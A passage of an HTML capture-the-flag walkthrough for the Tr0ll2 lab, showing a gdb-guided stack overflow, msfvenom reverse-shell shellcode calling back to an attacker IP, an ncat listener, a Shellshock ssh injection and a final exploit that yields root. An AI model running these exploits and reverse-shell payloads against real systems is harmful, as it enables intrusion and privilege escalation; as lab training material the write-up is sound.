eb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbffffac0 in ?? ()
+(gdb) x 0xbffffac5
+x 0xbffffac5
+0xbffffac5:	0x68000706
+(gdb) run $(python -c 'print "A" * 268 + "\xc0\xfa\xff\xbf" + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
+<3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')                       
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+y
+
+Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\xc0\xfa\xff\xbf" + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbffffac0 in ?? ()
+(gdb) x 0xbffffac5
+x 0xbffffac5
+0xbffffac5:	0x0b080706
+(gdb) x 0xbffffac6
+x 0xbffffac6
+0xbffffac6:	0x0c0b0807
+(gdb) x 0xbffffac7
+x 0xbffffac7
+0xbffffac7:	0x0d0c0b08
+(gdb) x 0xbffffac8
+x 0xbffffac8
+0xbffffac8:	0x0e0d0c0b
+(gdb) x 0xbffffac9
+x 0xbffffac9
+0xbffffac9:	0x0f0e0d0c
+(gdb) x 0xbffffaca
+x 0xbffffaca
+0xbffffaca:	0x100f0e0d
+(gdb) x 0xbffffacb
+x 0xbffffacb
+0xbffffacb:	0x11100f0e
+(gdb) x 0xbffffacc
+x 0xbffffacc
+0xbffffacc:	0x1211100f
+(gdb) x 0xbffffacd
+x 0xbffffacd
+0xbffffacd:	0x13121110
+(gdb) x 0xbfffface
+x 0xbfffface
+0xbfffface:	0x14131211
+(gdb) x 0xbffffacf
+x 0xbffffacf
+0xbffffacf:	0x15141312
+(gdb) x 0xbffffad0
+x 0xbffffad0
+0xbffffad0:	0x16151413
+(gdb) x 0xbffffad1
+x 0xbffffad1
+0xbffffad1:	0x17161514
+(gdb) x 0xbffffad2
+x 0xbffffad2
+0xbffffad2:	0x18171615
+(gdb) x 0xbffffad3
+x 0xbffffad3
+0xbffffad3:	0x19181716
+(gdb) x 0xbffffad4
+x 0xbffffad4
+0xbffffad4:	0x1a191817
+(gdb) x 0xbffffad5
+x 0xbffffad5
+0xbffffad5:	0x1b1a1918
+(gdb) x 0xbffffad6
+x 0xbffffad6
+0xbffffad6:	0x1c1b1a19
+(gdb) x 0xbffffad7
+x 0xbffffad7
+0xbffffad7:	0x1d1c1b1a
+</pre>
+<p><font size="3.5" color="black">Bad chars are "\x09\x0a".</font></p>
+<p><font size="3.5" color="black">Preparation of the shellcode:</font></p>
+<pre style="background-color:black;color:white;">
+noob@Tr0ll2:~$ uname -a
+uname -a
+Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
+</pre>
+<br>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.4]$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.43.3 LPORT=443 -f c -a x86 --platform linux -e x86/shikata_ga_nai -b "\x09\x0a"
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 150 (iteration=0)
+x86/shikata_ga_nai chosen with final size 150
+Payload size: 150 bytes
+Final size of c file: 654 bytes
+unsigned char buf[] = 
+"\xb8\x25\x45\x74\x7c\xd9\xc3\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x1f\x83\xc2\x04\x31\x42\x11\x03\x42\x11\xe2\xd0\x2f\x7e\x22"
+"\x2b\x6b\x89\x39\x18\xc8\x25\xd4\x9c\x7e\xaf\xa1\x41\xb3\xb0"
+"\x25\xda\x24\x71\xe1\xf7\xb7\x19\xf0\x07\xb9\x62\x7d\xe6\xd3"
+"\xf2\x26\xb8\x72\xac\x5f\xd9\x36\x9f\xe0\x9c\x79\x66\xf8\xd0"
+"\x0d\xa4\x92\x4e\xed\xd6\x62\xd6\x84\xd6\x08\xe3\xd1\x34\xfd"
+"\x22\x2c\x3a\x7b\x74\xd6\x86\x6f\x53\x9b\xfe\xd6\x9b\xcb\x00"
+"\x29\x12\x08\xc1\xc2\x28\x0e\x21\x18\x80\xed\x6b\xa1\x65\xcd"
+"\x0c\xb2\x3e\x47\x0d\x2b\x76\x5b\x7e\x4f\xbb\xe4\xfb\x90\x3b"
+"\xe7\xfc\xf0\x03\xe6\x02\xf3\x73\x52\x03\xf3\x73\xa4\xc9\x73";
+</pre>
+<p><font size="3.5" color="black">Final buffer invoke:</font></p>
+<pre style="background-color:black;color:white;">
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ md5sum r00t
+md5sum r00t
+0e1049b1040b0598a364f33de29cc2a7  r00t
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\xc0\xfa\xff\xbf" + "\x90" * 5 + "\xb8\x25\x45\x74\x7c\xd9\xc3\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x1f\x83\xc2\x04\x31\x42\x11\x03\x42\x11\xe2\xd0\x2f\x7e\x22\x2b\x6b\x89\x39\x18\xc8\x25\xd4\x9c\x7e\xaf\xa1\x41\xb3\xb0\x25\xda\x24\x71\xe1\xf7\xb7\x19\xf0\x07\xb9\x62\x7d\xe6\xd3\xf2\x26\xb8\x72\xac\x5f\xd9\x36\x9f\xe0\x9c\x79\x66\xf8\xd0\x0d\xa4\x92\x4e\xed\xd6\x62\xd6\x84\xd6\x08\xe3\xd1\x34\xfd\x22\x2c\x3a\x7b\x74\xd6\x86\x6f\x53\x9b\xfe\xd6\x9b\xcb\x00\x29\x12\x08\xc1\xc2\x28\x0e\x21\x18\x80\xed\x6b\xa1\x65\xcd\x0c\xb2\x3e\x47\x0d\x2b\x76\x5b\x7e\x4f\xbb\xe4\xfb\x90\x3b\xe7\xfc\xf0\x03\xe6\x02\xf3\x73\x52\x03\xf3\x73\xa4\xc9\x73"')
+f0\x03\xe6\x02\xf3\x73\x52\x03\xf3\x73\xa4\xc9\x73"')                       
+Segmentation fault
+</pre>
+<p><font size="3.5" color="black">Listener:</font></p>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.4]$ sudo ncat -lvnp 443
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 192.168.43.4.
+Ncat: Connection from 192.168.43.4:33128.
+</pre>
+<p><font size="3.5" color="black">I got a connection back to my attacking machine but it was not stable.</font></p>
+<p><font size="3.5" color="black">I edited my shellcode (Thanks to http://shell-storm.org/shellcode/files/shellcode-827.php) and finally I got the flag:</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# ssh noob@192.168.43.4 -i noob '() { :;}; /bin/bash'
+python -c 'import pty;pty.spawn("/bin/bash")'
+noob@Tr0ll2:~$ md5sum /nothing_to_see_here/choose_wisely/door2/r00t
+md5sum /nothing_to_see_here/choose_wisely/door2/r00t
+0e1049b1040b0598a364f33de29cc2a7  /nothing_to_see_here/choose_wisely/door2/r00t
+noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/./r00t $(python -c 'print "A" * 268 + "\xc0\xfa\xff\xbf" + "\x90" * 5 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+<\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')         
+# whoami
+whoami
+root
+# pwd
+pwd
+/home/noob
+# cd /root;ls -aul
+cd /root;ls -aul
+total 84
+drwx------ 12 root   root   4096 Oct 30 17:25 .
+drwxr-xr-x 23 root   root   4096 Oct 30 07:45 ..
+-rw-------  1 root   root    113 Oct 24  2014 .bash_history
+-rw-r--r--  1 root   root   3106 Oct 24  2014 .bashrc
+drwx------  2 root   root   4096 Oct 24  2014 .cache
+-rw-r--r--  1 root   root    140 Oct 24  2014 .profile
+-rw-r--r--  1 root   root     66 Oct  5  2014 .selected_editor
+drwx------  2 root   root   4096 Oct  6  2014 .ssh
+drwxr-xr-x  2 root   root   4096 Oct  6  2014 .vim
+-rw-------  1 root   root   4259 Oct 14  2014 .viminfo
+-rw-r--r--  1 root   root     68 Oct 14  2014 Proof.txt
+drwxr-xr-x  5 root   root   4096 Oct 30 13:00 core1
+drwxr-xr-x  5 root   root   4096 Oct 30 13:15 core2
+drwxr-xr-x  5 root   root   4096 Oct 30 12:30 core3
+drwxr-xr-x  5 root   root   4096 Oct 30 12:15 core4
+drwxr-xr-x  2 root   root   4096 Oct 14  2014 goal
+drwxr-xr-x  2 root   root   4096 Oct  6  2014 hardmode
+-rw-r--r--  1 maleus maleus 1474 Oct  6  2014 lmao.zip
+-rw-r--r--  1 root   root    828 Oct 30 12:15 ran_dir.py
+drwxr-xr-x  2 root   root   4096 Oct  6  2014 reboot
+# cat Proof.txt
+cat Proof.txt
+You win this time young Jedi...
+
+a70354f0258dcc00292c72aab3c8b1e4  
+# 
+</pre>
+
+
+</div>
+</div>
+
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+
+
+
+
+
+<!-- ##### All Javascript Files ##### -->
+<!-- jQuery-2.2.4 js -->
+<script src="js/jquery/jquery-2.2.4.min.js"></script>
+<!-- Popper js -->
+<script src="js/bootstrap/popper.min.js"></script>
+<!-- Bootstrap js -->
+<script src="js/bootstrap/bootstrap.min.js"></script>
+<!-- All Plugins js -->
+<script src="js/plugins/plugins.js"></script>
+<!-- Active js -->
+<script src="js/active.js"></script>
+
+</body>
+
+</html>
